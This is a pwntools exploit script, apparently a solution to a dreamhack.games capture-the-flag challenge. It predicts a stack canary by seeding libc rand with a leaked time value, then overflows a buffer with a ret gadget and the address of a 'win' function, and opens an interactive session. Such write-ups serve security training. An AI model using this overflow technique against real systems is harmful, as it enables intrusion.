#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./deploy/prob")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 9743)

    return r


def main():
    r = conn()

    r.recvuntil(b"time: ")
    time = int(r.recvline()[:-1])

    libc = ctypes.CDLL("libc.so.6")
    libc.srand(time)

    canary = 0
    for i in range(8):
        canary = ((canary << 8) | (libc.rand() & 0xFF))

    payload = b"A" * 0x10
    payload += p64(canary)
    payload += b"A" * 0x10
    payload += p64(ROP(exe).find_gadget(["ret"])[0])
    payload += p64(exe.symbols["win"])

    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()